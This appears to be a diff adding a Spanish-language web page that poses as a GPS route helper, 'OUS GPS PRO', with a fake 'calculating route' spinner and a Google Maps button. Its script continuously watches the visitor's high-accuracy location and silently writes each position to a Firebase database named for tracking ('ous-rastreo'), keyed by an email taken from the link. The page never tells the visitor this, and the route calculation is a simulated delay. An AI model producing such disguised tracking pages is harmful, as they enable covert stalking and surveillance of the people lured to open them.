@@ -1,1 +1,284 @@
+<!DOCTYPE html>
+<html lang="es">
+<head>
 
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width, initial-scale=1">
+
+<title>OUS GPS PRO</title>
+
+<style>
+
+:root{
+  --primary:#2563eb;
+  --bg:#f1f5f9;
+  --text:#1e293b;
+  --muted:#64748b;
+}
+
+html,body{
+  margin:0;
+  padding:0;
+  height:100%;
+  font-family:"Segoe UI",Arial,sans-serif;
+  background:var(--bg);
+}
+
+.container{
+  height:100vh;
+  display:flex;
+  justify-content:center;
+  align-items:center;
+  padding:20px;
+}
+
+.card{
+  width:100%;
+  max-width:420px;
+  background:white;
+  border-radius:20px;
+  padding:30px;
+  text-align:center;
+  box-shadow:0 20px 60px rgba(0,0,0,.15);
+}
+
+.logo{
+  font-size:60px;
+  margin-bottom:10px;
+}
+
+h2{
+  margin:0;
+  color:var(--text);
+}
+
+#estado{
+  margin-top:20px;
+  color:var(--muted);
+  font-size:15px;
+  line-height:1.6;
+}
+
+.loader{
+  width:50px;
+  height:50px;
+  border:4px solid #e5e7eb;
+  border-top:4px solid var(--primary);
+  border-radius:50%;
+  animation:spin 1s linear infinite;
+  margin:25px auto;
+}
+
+@keyframes spin{
+  from{transform:rotate(0deg);}
+  to{transform:rotate(360deg);}
+}
+
+.btn{
+  width:100%;
+  padding:14px;
+  border:none;
+  border-radius:12px;
+  background:var(--primary);
+  color:white;
+  font-size:15px;
+  font-weight:600;
+  cursor:pointer;
+  transition:.2s;
+}
+
+.btn:hover{
+  transform:translateY(-2px);
+}
+
+.btn:disabled{
+  opacity:.5;
+  cursor:not-allowed;
+  transform:none;
+}
+
+.info{
+  margin-top:15px;
+  font-size:13px;
+  color:#94a3b8;
+}
+
+</style>
+
+</head>
+
+<body>
+
+<div class="container">
+
+  <div class="card">
+
+    <div class="logo">📍</div>
+
+    <h2>OUS GPS PRO</h2>
+
+    <div id="estado">
+      Calculando tu ruta...
+    </div>
+
+    <div class="loader" id="loader"></div>
+
+    <button
+      id="btnMaps"
+      class="btn"
+      disabled>
+      Abrir Google Maps
+    </button>
+
+    <div class="info">
+      Espere mientras preparamos la navegación.
+    </div>
+
+  </div>
+
+</div>
+
+<script type="module">
+
+import { initializeApp } from "https://www.gstatic.com/firebasejs/12.0.0/firebase-app.js";
+
+import {
+  getFirestore,
+  doc,
+  setDoc
+} from "https://www.gstatic.com/firebasejs/12.0.0/firebase-firestore.js";
+
+const firebaseConfig = {
+  apiKey: "AIzaSyBz9IVIpECD16fSo5Sz2jc6SZkTJHr2bk0",
+  authDomain: "ous-rastreo.firebaseapp.com",
+  projectId: "ous-rastreo",
+  storageBucket: "ous-rastreo.firebasestorage.app",
+  messagingSenderId: "606108188440",
+  appId: "1:606108188440:web:0416b98a7738af947ae86d"
+};
+
+const app = initializeApp(firebaseConfig);
+const db = getFirestore(app);
+
+// ======================
+// PARAMETROS
+// ======================
+
+const params =
+new URLSearchParams(
+window.location.search
+);
+
+const correo =
+params.get("correo");
+
+const direccion =
+params.get("direccion");
+
+if(!correo){
+
+  document
+  .getElementById("estado")
+  .innerHTML =
+  "Error: falta correo";
+
+  throw new Error("Falta correo");
+
+}
+
+// ======================
+// GPS EN TIEMPO REAL
+// ======================
+
+navigator.geolocation.watchPosition(
+
+async(pos)=>{
+
+  const lat =
+  pos.coords.latitude;
+
+  const lng =
+  pos.coords.longitude;
+
+  await setDoc(
+    doc(db,"ubicaciones",correo),
+    {
+      correo,
+      lat,
+      lng,
+      direccion,
+      fecha:new Date().toLocaleString(),
+      timestamp:Date.now()
+    }
+  );
+
+},
+
+(err)=>{
+
+  document
+  .getElementById("estado")
+  .innerHTML =
+  "Error GPS: " +
+  err.message;
+
+},
+
+{
+  enableHighAccuracy:true
+}
+
+);
+
+// ======================
+// SIMULA CALCULO RUTA
+// ======================
+
+setTimeout(()=>{
+
+  document
+  .getElementById("estado")
+  .innerHTML =
+  "Ruta lista para navegación.";
+
+  document
+  .getElementById("loader")
+  .style.display =
+  "none";
+
+  document
+  .getElementById("btnMaps")
+  .disabled =
+  false;
+
+},3000);
+
+// ======================
+// GOOGLE MAPS
+// ======================
+
+document
+.getElementById("btnMaps")
+.onclick = ()=>{
+
+  if(!direccion){
+
+    alert(
+      "No se encontró dirección destino"
+    );
+
+    return;
+
+  }
+
+  window.open(
+    "https://www.google.com/maps/search/?api=1&query="
+    + encodeURIComponent(direccion)
+  );
+
+};
+
+</script>
+
+</body>
+</html>
